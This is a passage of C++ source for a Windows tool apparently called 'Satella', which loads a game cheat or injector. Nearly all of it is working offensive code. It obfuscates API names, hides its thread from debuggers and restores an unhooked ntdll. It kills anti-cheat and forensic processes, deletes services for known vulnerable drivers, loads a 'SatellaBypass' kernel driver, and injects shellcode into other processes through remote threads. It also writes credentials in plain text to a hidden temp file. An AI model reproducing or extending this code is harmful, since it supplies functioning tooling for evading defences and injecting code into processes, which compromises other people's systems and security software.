#define _CRT_SECURE_NO_WARNINGS
#include <string>
#include <vector>
#include <cwctype>
#include <windows.h>
#include <wininet.h>
#include <urlmon.h>
#include <winhttp.h>
#include <math.h>
#include <string.h>
#include <stdlib.h>
#include <cstdio>
#include <time.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <psapi.h>
#include <shellapi.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "psapi.lib")

#include "source/Cfg/strenc.h"
#include "auth_bot/ka_bridge_api.h"
#include "dynimp.h"
#include "dns_hook_data.h"
#include "obfuscate_api.h"
#include "dynapi.h"

#define printf(...) ((void)0)

#define FILE_DEVICE_UNKNOWN 0x00000022
#define METHOD_BUFFERED 0
#define FILE_ANY_ACCESS 0
#define CTL_CODE(DeviceType, Function, Method, Access) (((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))

#define IOCTL_BYPASS_PROTECT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_BYPASS_HIDE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_BYPASS_PATCH CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#ifndef ARRAYSIZE
#define ARRAYSIZE(x) (sizeof(x)/sizeof((x)[0]))
#endif

typedef struct { float x, y, spd, sz; int al; } Part;
static Part pts[120];
static int g_inj = 0, g_ok = 0, g_log = 0, g_reg = 0, g_err = 0, g_hov = 0, g_foc = 0, g_click = 0;
static int g_bypass = 0, g_drvLoaded = 0, g_admin = 0;
static wchar_t g_u[64] = L"", g_p[64] = L"", g_k[256] = L"";
static float g_dt = 0.016f;
static char g_st[256] = "";
static int g_cx = 600, g_cy = 350;
static float g_prog = 0.0f, g_bypassProg = 0.0f;
static float g_xHover = 0.0f;
static HANDLE g_hDriver = INVALID_HANDLE_VALUE;
static HMODULE g_ntdll = NULL;
static HWND g_hwnd = NULL;

static void rnd() {
    srand((unsigned)time(0));
    for (int i = 0; i < 120; i++) {
        pts[i].x = (float)(rand() % 600);
        pts[i].y = (float)(rand() % 350);
        pts[i].spd = 20 + (float)(rand() % 400) / 10.0f;
        pts[i].sz = 1 + (float)(rand() % 20) / 10.0f;
        pts[i].al = 120 + rand() % 100;
    }
}

static void dbox(HDC h, int x, int y, int w, int hh, int rr, COLORREF f, COLORREF b) {
    HBRUSH fb = CreateSolidBrush(f);
    HPEN bp = CreatePen(PS_SOLID, 1, b);
    SelectObject(h, fb); SelectObject(h, bp);
    RoundRect(h, x, y, x+w, y+hh, rr, rr);
    DeleteObject(fb); DeleteObject(bp);
}

static void dt(HDC h, const wchar_t* s, int x, int y, int w, int hh, UINT f, COLORREF c) {
    SetBkMode(h, TRANSPARENT); SetTextColor(h, c);
    RECT r = {x,y,x+w,y+hh}; DrawTextW(h,s,-1,&r,f);
}

static void saveCredFile(const char* u, const char* pwd) {
    wchar_t path[MAX_PATH]; GetTempPathW(MAX_PATH, path); wcscat(path, L"Satella.cred");
    HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        wchar_t buf[128]; wsprintfW(buf, L"%hs|%hs", u, pwd);
        DWORD wb; WriteFile(f, buf, (wcslen(buf)*2+2), &wb, NULL);
        CloseHandle(f);
    }
}

static int tryAuthFromCredFile() {
    wchar_t credPath[MAX_PATH]; GetTempPathW(MAX_PATH, credPath); wcscat(credPath, L"Satella.cred");
    HANDLE cf = CreateFileW(credPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (cf == INVALID_HANDLE_VALUE) return 0;
    DWORD rd; wchar_t raw[128] = {};
    ReadFile(cf, raw, sizeof(raw)-2, &rd, NULL); CloseHandle(cf);
    wchar_t* sep = wcschr(raw, L'|'); if (!sep) return 0;
    sep[0] = 0; char u[64]={}, pwd[64]={};
    wcstombs(u, raw, 63); wcstombs(pwd, sep+1, 63);
    return ka_login(u, pwd);
}

static int IsAdmin() {
    BOOL isAdmin = FALSE; HANDLE hToken = NULL;
    if (DynOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION te = {}; DWORD sz = sizeof(te);
        if (GetTokenInformation(hToken, TokenElevation, &te, sz, &sz)) isAdmin = te.TokenIsElevated;
        DynCloseHandle(hToken);
    }
    return isAdmin;
}

static BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    if (!DynOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!DynLookupPrivilegeValueA(NULL, AY_OBFUSCATE("SeDebugPrivilege"), &tp.Privileges[0].Luid)) {
        DynCloseHandle(hToken); return FALSE;
    }
    BOOL ok = DynAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DynCloseHandle(hToken);
    return ok && GetLastError() == ERROR_SUCCESS;
}

typedef NTSTATUS (NTAPI *FN_NtSetInformationThread)(HANDLE, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *FN_NtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);

static void HideThread() {
    if (!g_ntdll) g_ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!g_ntdll) return;
    FN_NtSetInformationThread fn = (FN_NtSetInformationThread)GetProcAddress(g_ntdll, "NtSetInformationThread");
    if (fn) {
        HANDLE hThread = GetCurrentThread();
        fn(hThread, 0x11, NULL, 0);
    }
}

static void ProtectProcessBreakOnTermination() {
    if (!g_ntdll) g_ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!g_ntdll) return;
    FN_NtSetInformationProcess fn = (FN_NtSetInformationProcess)GetProcAddress(g_ntdll, "NtSetInformationProcess");
    if (fn) {
        ULONG breakOnTermination = 1;
        fn(GetCurrentProcess(), 0x1D, &breakOnTermination, sizeof(breakOnTermination));
    }
}

static void RestoreNtdll() {
    wchar_t sysPath[MAX_PATH];
    GetSystemDirectoryW(sysPath, MAX_PATH);
    wcscat(sysPath, L"\\ntdll.dll");
    HANDLE hFile = CreateFileW(sysPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    DWORD size = GetFileSize(hFile, NULL);
    if (size < 0x1000) { CloseHandle(hFile); return; }
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) { CloseHandle(hFile); return; }
    LPVOID base = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!base) { CloseHandle(hMapping); CloseHandle(hFile); return; }
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    HMODULE mod = GetModuleHandleW(L"ntdll.dll");
    BYTE* modBase = (BYTE*)mod;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE)) {
            DWORD old;
            VirtualProtect(modBase + sec[i].VirtualAddress, sec[i].SizeOfRawData, PAGE_EXECUTE_READWRITE, &old);
            memcpy(modBase + sec[i].VirtualAddress, (BYTE*)base + sec[i].PointerToRawData, sec[i].SizeOfRawData);
            VirtualProtect(modBase + sec[i].VirtualAddress, sec[i].SizeOfRawData, old, &old);
        }
    }
    UnmapViewOfFile(base); CloseHandle(hMapping); CloseHandle(hFile);
}

typedef struct { const wchar_t* name; const wchar_t* sys; } DrvEntry;
static void DoEnableDbg() { __try { EnableDebugPrivilege(); } __except(1) {} }

static void KillProcs() {
    static auto _OpenProcess = (decltype(&OpenProcess))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("OpenProcess"));
    static auto _TerminateProcess = (decltype(&TerminateProcess))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("TerminateProcess"));
    static auto _CreateToolhelp32Snapshot = (decltype(&CreateToolhelp32Snapshot))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("CreateToolhelp32Snapshot"));
    static auto _Process32FirstW = (decltype(&Process32FirstW))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("Process32FirstW"));
    static auto _Process32NextW = (decltype(&Process32NextW))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("Process32NextW"));
    const wchar_t* killProcs[] = { AY_OBFUSCATE(L"g.fix"), AY_OBFUSCATE(L"g_fix"), AY_OBFUSCATE(L"SatellaGate"), AY_OBFUSCATE(L"Phantom"), AY_OBFUSCATE(L"Keller"), AY_OBFUSCATE(L"DFIRemv") };
    if (!_CreateToolhelp32Snapshot || !_Process32FirstW || !_Process32NextW) return;
    HANDLE ss = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (ss == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (_Process32FirstW(ss, &pe)) do {
        for (int i = 0; i < 6; i++) {
            if (wcsstr(pe.szExeFile, killProcs[i])) {
                HANDLE hp = _OpenProcess ? _OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID) : NULL;
                if (hp) { if (_TerminateProcess) _TerminateProcess(hp, 0); CloseHandle(hp); }
                break;
            }
        }
    } while (_Process32NextW(ss, &pe));
    CloseHandle(ss);
}

static void KillDrvs() {
    static auto _OpenSCManagerW = (decltype(&OpenSCManagerW))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("OpenSCManagerW"));
    static auto _OpenServiceW = (decltype(&OpenServiceW))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("OpenServiceW"));
    static auto _ControlService = (decltype(&ControlService))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("ControlService"));
    static auto _DeleteService = (decltype(&DeleteService))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("DeleteService"));
    static auto _CloseServiceHandle = (decltype(&CloseServiceHandle))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("CloseServiceHandle"));
    const DrvEntry killDrvs[] = {
        { AY_OBFUSCATE(L"iqvw64e"), AY_OBFUSCATE(L"iqvw64e.sys") }, { AY_OBFUSCATE(L"AsrDrv101"), AY_OBFUSCATE(L"AsrDrv101.sys") },
        { AY_OBFUSCATE(L"dbutil_2_3"), AY_OBFUSCATE(L"dbutil_2_3.sys") }, { AY_OBFUSCATE(L"RTCore64"), AY_OBFUSCATE(L"RTCore64.sys") },
        { AY_OBFUSCATE(L"WinIo64"), AY_OBFUSCATE(L"WinIo64.sys") }, { AY_OBFUSCATE(L"gdrv"), AY_OBFUSCATE(L"gdrv.sys") },
        { AY_OBFUSCATE(L"PhysMem"), AY_OBFUSCATE(L"PhysMem.sys") }, { AY_OBFUSCATE(L"kGuard"), AY_OBFUSCATE(L"kGuard.sys") },
    };
    if (!_OpenSCManagerW || !_OpenServiceW || !_ControlService || !_DeleteService || !_CloseServiceHandle) return;
    SC_HANDLE scm = _OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return;
    for (int i = 0; i < 8; i++) {
        SC_HANDLE svc = _OpenServiceW(scm, killDrvs[i].name, SERVICE_STOP | DELETE);
        if (svc) { SERVICE_STATUS ss2; _ControlService(svc, SERVICE_CONTROL_STOP, &ss2); _DeleteService(svc); _CloseServiceHandle(svc); }
    }
    _CloseServiceHandle(scm);
}

static void KillKellerGuard() {
    DoEnableDbg();
    KillProcs();
    KillDrvs();
    Sleep(200);
}

static int LoadDriver() {
    static auto _OpenSCManagerW = (decltype(&OpenSCManagerW))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("OpenSCManagerW"));
    static auto _CreateServiceW = (decltype(&CreateServiceW))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("CreateServiceW"));
    static auto _OpenServiceW = (decltype(&OpenServiceW))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("OpenServiceW"));
    static auto _StartServiceW = (decltype(&StartServiceW))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("StartServiceW"));
    static auto _DeleteService = (decltype(&DeleteService))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("DeleteService"));
    static auto _CloseServiceHandle = (decltype(&CloseServiceHandle))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("CloseServiceHandle"));
    if (!_OpenSCManagerW || !_CloseServiceHandle) return 0;
    const wchar_t* drvPath = AY_OBFUSCATE(L"\\??\\C:\\Windows\\System32\\drivers\\SatellaBypass.sys");
    SC_HANDLE scm = _OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return 0;
    SC_HANDLE svc = _CreateServiceW ? _CreateServiceW(scm, AY_OBFUSCATE(L"SatellaBypass"), AY_OBFUSCATE(L"SatellaBypass"), SERVICE_START | DELETE, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, drvPath, NULL, NULL, NULL, NULL, NULL) : NULL;
    if (!svc) {
        svc = _OpenServiceW ? _OpenServiceW(scm, AY_OBFUSCATE(L"SatellaBypass"), SERVICE_START | DELETE) : NULL;
        if (!svc) { _CloseServiceHandle(scm); return 0; }
    }
    BOOL ok = _StartServiceW ? _StartServiceW(svc, 0, NULL) : FALSE;
    if (!ok && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) { if (_DeleteService) _DeleteService(svc); _CloseServiceHandle(svc); _CloseServiceHandle(scm); return 0; }
    _CloseServiceHandle(svc); _CloseServiceHandle(scm);
    g_hDriver = CreateFileW(AY_OBFUSCATE(L"\\\\.\\SatellaBypass"), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    g_drvLoaded = (g_hDriver != INVALID_HANDLE_VALUE);
    return g_drvLoaded;
}

static void UnloadDriver() {
    if (g_hDriver != INVALID_HANDLE_VALUE) { CloseHandle(g_hDriver); g_hDriver = INVALID_HANDLE_VALUE; }
    static auto _OpenSCManagerW = (decltype(&OpenSCManagerW))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("OpenSCManagerW"));
    static auto _OpenServiceW = (decltype(&OpenServiceW))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("OpenServiceW"));
    static auto _ControlService = (decltype(&ControlService))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("ControlService"));
    static auto _DeleteService = (decltype(&DeleteService))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("DeleteService"));
    static auto _CloseServiceHandle = (decltype(&CloseServiceHandle))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("advapi32.dll")), AY_OBFUSCATE("CloseServiceHandle"));
    if (!_OpenSCManagerW || !_CloseServiceHandle) return;
    SC_HANDLE scm = _OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return;
    SC_HANDLE svc = _OpenServiceW ? _OpenServiceW(scm, L"SatellaBypass", SERVICE_STOP | DELETE) : NULL;
    if (svc) {
        SERVICE_STATUS ss; if (_ControlService) _ControlService(svc, SERVICE_CONTROL_STOP, &ss);
        if (_DeleteService) _DeleteService(svc); _CloseServiceHandle(svc);
    }
    _CloseServiceHandle(scm);
    g_drvLoaded = 0;
}

static void DrvSendIOCTL(DWORD ctl, ULONG pid) {
    if (g_hDriver == INVALID_HANDLE_VALUE) return;
    UCHAR buf[sizeof(ULONG) + 4];
    *(ULONG*)buf = pid;
    DWORD ret;
    DeviceIoControl(g_hDriver, ctl, buf, sizeof(buf), buf, sizeof(buf), &ret, NULL);
}

static void UserModeBypass() {
    EnableDebugPrivilege();
    HideThread();
    if (!g_drvLoaded) ProtectProcessBreakOnTermination();
    for (int i = 0; i < 10; i++) {
        g_bypassProg = (float)(i + 1) / 10.0f;
        InvalidateRect(g_hwnd, NULL, TRUE);
        Sleep(50);
    }
}

static void DelayedBypassThread() {
    g_bypass = 2; InvalidateRect(g_hwnd, NULL, TRUE);
    strcpy(g_st, "Restaurando ntdll...");
    RestoreNtdll();
    strcpy(g_st, "Carregando driver...");
    int drvOk = LoadDriver();
    if (!drvOk) strcpy(g_st, "Driver nao disponivel, usando modo usuarios...");
    else strcpy(g_st, "Driver carregado.");
    if (drvOk) {
        DrvSendIOCTL(IOCTL_BYPASS_PROTECT, GetCurrentProcessId());
        Sleep(100);
        DrvSendIOCTL(IOCTL_BYPASS_HIDE, GetCurrentProcessId());
        Sleep(100);
    }
    UserModeBypass();
    g_bypass = 1;
    strcpy(g_st, drvOk ? "Bypass ativo (kernel + user)" : "Bypass ativo (user-mode)");
    InvalidateRect(g_hwnd, NULL, TRUE);
}

static void StartBypass() {
    g_bypass = 2; g_bypassProg = 0;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DelayedBypassThread, NULL, 0, NULL);
}

static HANDLE OpenProcessForInject(DWORD pid) {
    static auto _OpenProcess = (decltype(&DynOpenProcess))GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("OpenProcess"));
    if (!_OpenProcess) return NULL;
    HANDLE hp = NULL;
    FARPROC pNtOpenProcess = GetProcAddress(GetModuleHandleW(AY_OBFUSCATE(L"ntdll.dll")), AY_OBFUSCATE("NtOpenProcess"));
    DWORD masks[] = {
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        PROCESS_ALL_ACCESS,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
    };
    for (int i = 0; i < 5 && !hp; i++) {
        if (pNtOpenProcess) {
            struct { ULONG L; HANDLE R; PVOID O; ULONG A; PVOID S; PVOID Q; } oa = { sizeof(oa), 0, 0, OBJ_CASE_INSENSITIVE, 0, 0 };
            struct { HANDLE U; HANDLE T; } cid = { (HANDLE)(UINT_PTR)pid, 0 };
            ((NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,PVOID,PVOID))pNtOpenProcess)(&hp, masks[i], &oa, &cid);
        }
        if (!hp) hp = _OpenProcess(masks[i], FALSE, pid);
    }
    return hp;
}

// ===================== REFLECTIVE INJECTION =====================

static const BYTE g_ShellcodeStub[] = {
    0x48, 0xB9, 0,0,0,0,0,0,0,0,
    0xBA, 0x01,0,0,0,
    0x45, 0x31, 0xC0,
    0x48, 0x83, 0xEC, 0x28,
    0x48, 0xB8, 0,0,0,0,0,0,0,0,
    0xFF, 0xD0,
    0x48, 0x83, 0xC4, 0x28,
    0x33, 0xC0,
    0xC3
};

static ULONGLONG GetTargetModuleBase(DWORD pid, const wchar_t* fname) {
    static auto _CreateToolhelp32Snapshot = (decltype(&CreateToolhelp32Snapshot))GetProcAddress(GetModuleHandleW(AY_OBFUSCATE(L"kernel32.dll")), AY_OBFUSCATE("CreateToolhelp32Snapshot"));
    static auto _Module32FirstW = (decltype(&Module32FirstW))GetProcAddress(GetModuleHandleW(AY_OBFUSCATE(L"kernel32.dll")), AY_OBFUSCATE("Module32FirstW"));
    static auto _Module32NextW = (decltype(&Module32NextW))GetProcAddress(GetModuleHandleW(AY_OBFUSCATE(L"kernel32.dll")), AY_OBFUSCATE("Module32NextW"));
    if (!_CreateToolhelp32Snapshot || !_Module32FirstW || !_Module32NextW) return 0;
    HANDLE snap = _CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    ULONGLONG result = 0;
    MODULEENTRY32W me = {sizeof(me)};
    if (_Module32FirstW(snap, &me)) do {
        if (_wcsicmp(me.szModule, fname) == 0) { result = (ULONGLONG)me.modBaseAddr; break; }
    } while (_Module32NextW(snap, &me));
    CloseHandle(snap);
    return result;
}

static ULONGLONG LoadRemoteModule(HANDLE hProcess, DWORD pid, const wchar_t* dllName);

static ULONGLONG ResolveApiAddr(DWORD pid, const char* dllName, const char* funcName) {
    HMODULE hLocal = LoadLibraryA(dllName);
    if (!hLocal) return 0;
    FARPROC localFunc = GetProcAddress(hLocal, funcName);
    if (!localFunc) { FreeLibrary(hLocal); return 0; }
    HMODULE hActual = NULL;
    GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)localFunc, &hActual);
    ULONGLONG actualBase = (ULONGLONG)(hActual ? hActual : hLocal);
    ULONGLONG rva = (ULONGLONG)localFunc - actualBase;
    FreeLibrary(hLocal);
    wchar_t modPath[MAX_PATH];
    if (!GetModuleFileNameW((HMODULE)actualBase, modPath, MAX_PATH)) return 0;
    wchar_t* fn = wcsrchr(modPath, L'\\');
    fn = fn ? fn + 1 : modPath;
    ULONGLONG tgtBase = GetTargetModuleBase(pid, fn);
    return tgtBase ? tgtBase + rva : 0;
}

static ULONGLONG ResolveApiAddrFromTarget(HANDLE hProcess, ULONGLONG modBase, const char* funcName) {
    IMAGE_DOS_HEADER dosH; SIZE_T rd;
    if (!ReadProcessMemory(hProcess, (LPCVOID)modBase, &dosH, sizeof(dosH), &rd) || rd != sizeof(dosH)) return 0;
    IMAGE_NT_HEADERS64 ntH;
    if (!ReadProcessMemory(hProcess, (LPCVOID)(modBase + dosH.e_lfanew), &ntH, sizeof(ntH), &rd) || rd != sizeof(ntH)) return 0;
    IMAGE_DATA_DIRECTORY* expDir = &ntH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (expDir->Size == 0 || expDir->VirtualAddress == 0) return 0;
    BYTE expBuf[1024];
    DWORD expSize = min(expDir->Size, (DWORD)sizeof(expBuf));
    if (!ReadProcessMemory(hProcess, (LPCVOID)(modBase + expDir->VirtualAddress), expBuf, expSize, &rd) || rd != expSize) return 0;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)expBuf;
    // Read full arrays using heap allocation
    DWORD nc = exp->NumberOfNames;
    DWORD fc = exp->NumberOfFunctions;
    DWORD* nameRvas = (DWORD*)malloc(nc * sizeof(DWORD));
    WORD* ords = (WORD*)malloc(nc * sizeof(WORD));
    DWORD* funcRvas = (DWORD*)malloc(fc * sizeof(DWORD));
    if (!nameRvas || !ords || !funcRvas) { free(nameRvas); free(ords); free(funcRvas); return 0; }
    BOOL ok1 = ReadProcessMemory(hProcess, (LPCVOID)(modBase + exp->AddressOfNames), nameRvas, nc * sizeof(DWORD), &rd);
    BOOL ok2 = ReadProcessMemory(hProcess, (LPCVOID)(modBase + exp->AddressOfNameOrdinals), ords, nc * sizeof(WORD), &rd);
    BOOL ok3 = ReadProcessMemory(hProcess, (LPCVOID)(modBase + exp->AddressOfFunctions), funcRvas, fc * sizeof(DWORD), &rd);
    if (!ok1 || !ok2 || !ok3) { free(nameRvas); free(ords); free(funcRvas); return 0; }
    // Search by name
    ULONGLONG result = 0;
    for (DWORD i = 0; i < nc; i++) {
        char nb[256]; SIZE_T nr;
        if (!ReadProcessMemory(hProcess, (LPCVOID)(modBase + nameRvas[i]), nb, 255, &nr)) continue;
        nb[255] = 0;
        if (strcmp(nb, funcName) == 0 && ords[i] < fc) {
            // Check for forwarded export (RVA inside export directory)
            DWORD fwdRva = funcRvas[ords[i]];
            if (fwdRva >= expDir->VirtualAddress && fwdRva < expDir->VirtualAddress + expDir->Size) {
                // Forwarded export: "DLL.Function"
                char forwarder[256];
                ReadProcessMemory(hProcess, (LPCVOID)(modBase + fwdRva), forwarder, 255, &nr);
                forwarder[255] = 0;
                char* dot = strchr(forwarder, '.');
                if (dot) {
                    *dot = 0;
                    char fwdDll[64]; strcpy(fwdDll, forwarder);
                    strcat(fwdDll, ".dll");
                    // Resolve recursively in target
                    wchar_t fwdW[64];
                    MultiByteToWideChar(CP_UTF8, 0, fwdDll, -1, fwdW, 64);
                    ULONGLONG fwdModBase = GetTargetModuleBase(GetProcessId(hProcess), fwdW);
                    if (!fwdModBase) {
                        HANDLE hp = hProcess;
                        fwdModBase = LoadRemoteModule(hp, GetProcessId(hProcess), fwdW);
                    }
                    if (fwdModBase) { result = ResolveApiAddrFromTarget(hProcess, fwdModBase, dot + 1); break; }
                }
                break;
            }
            result = modBase + fwdRva;
            break;
        }
    }
    free(nameRvas); free(ords); free(funcRvas);
    if (!result) printf("[rapi] Funcao '%s' nao encontrada em modBase=0x%llX (nc=%lu, fc=%lu)\n", funcName, modBase, nc, fc);
    return result;
}

static ULONGLONG ResolveApiAddrViaRemoteThread(HANDLE hProcess, const char* dllName, const char* funcName) {
    // Fallback: use remote thread to call LoadLibrary+GetProcAddress in target
    size_t dllLen = strlen(dllName) + 1, fnLen = strlen(funcName) + 1;
    void* remDll = DynVirtualAllocEx(hProcess, NULL, dllLen + fnLen, MEM_COMMIT, PAGE_READWRITE);
    if (!remDll) return 0;
    void* remFn = (BYTE*)remDll + dllLen;
    DynWriteProcessMemory(hProcess, remDll, dllName, dllLen, NULL);
    DynWriteProcessMemory(hProcess, remFn, funcName, fnLen, NULL);
    // Shellcode: rax = LoadLibraryA(remDll); rax = GetProcAddress(rax, remFn); ret
    BYTE sc[64] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB9, 0,0,0,0,0,0,0,0,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0xFF, 0xD0,
        0x48, 0x85, 0xC0, 0x74, 0x10,
        0x48, 0xBA, 0,0,0,0,0,0,0,0,
        0x48, 0x8B, 0xCB,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28, 0xC3
    };
    FARPROC pLL = GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("LoadLibraryA"));
    FARPROC pGP = GetProcAddress(GetModuleHandleA(AY_OBFUSCATE("kernel32.dll")), AY_OBFUSCATE("GetProcAddress"));
    if (!pLL || !pGP) return 0;
    *(ULONGLONG*)&sc[4] = (ULONGLONG)remDll;
    *(ULONGLONG*)&sc[12] = (ULONGLONG)pLL;
    *(ULONGLONG*)&sc[28] = (ULONGLONG)remFn;
    *(ULONGLONG*)&sc[39] = (ULONGLONG)pGP;
    void* remSc = DynVirtualAllocEx(hProcess, NULL, sizeof(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remSc) { DynVirtualFreeEx(hProcess, remDll, 0, MEM_RELEASE); return 0; }
    DynWriteProcessMemory(hProcess, remSc, sc, sizeof(sc), NULL);
    HANDLE ht = DynCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remSc, NULL, 0, NULL);
    if (!ht) { DynVirtualFreeEx(hProcess, remSc, 0, MEM_RELEASE); DynVirtualFreeEx(hProcess, remDll, 0, MEM_RELEASE); return 0; }
    WaitForSingleObject(ht, 10000);
    DWORD exitCode = 0;
    GetExitCodeThread(ht, &exitCode);
    CloseHandle(ht);
    DynVirtualFreeEx(hProcess, remSc, 0, MEM_RELEASE);
    DynVirtualFreeEx(hProcess, remDll, 0, MEM_RELEASE);
    return (ULONGLONG)exitCode;
}

static ULONGLONG ResolveApiAddrFromTargetOrd(HANDLE hProcess, ULONGLONG modBase, WORD ordinal) {
    IMAGE_DOS_HEADER dosH; SIZE_T rd;
    if (!ReadProcessMemory(hProcess, (LPCVOID)modBase, &dosH, sizeof(dosH), &rd) || rd != sizeof(dosH)) return 0;
    IMAGE_NT_HEADERS64 ntH;
    if (!ReadProcessMemory(hProcess, (LPCVOID)(modBase + dosH.e_lfanew), &ntH, sizeof(ntH), &rd) || rd != sizeof(ntH)) return 0;
    IMAGE_DATA_DIRECTORY* expDir = &ntH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (expDir->Size == 0 || expDir->VirtualAddress == 0) return 0;
    BYTE expBuf[1024];
    DWORD expSize = min(expDir->Size, (DWORD)sizeof(expBuf));
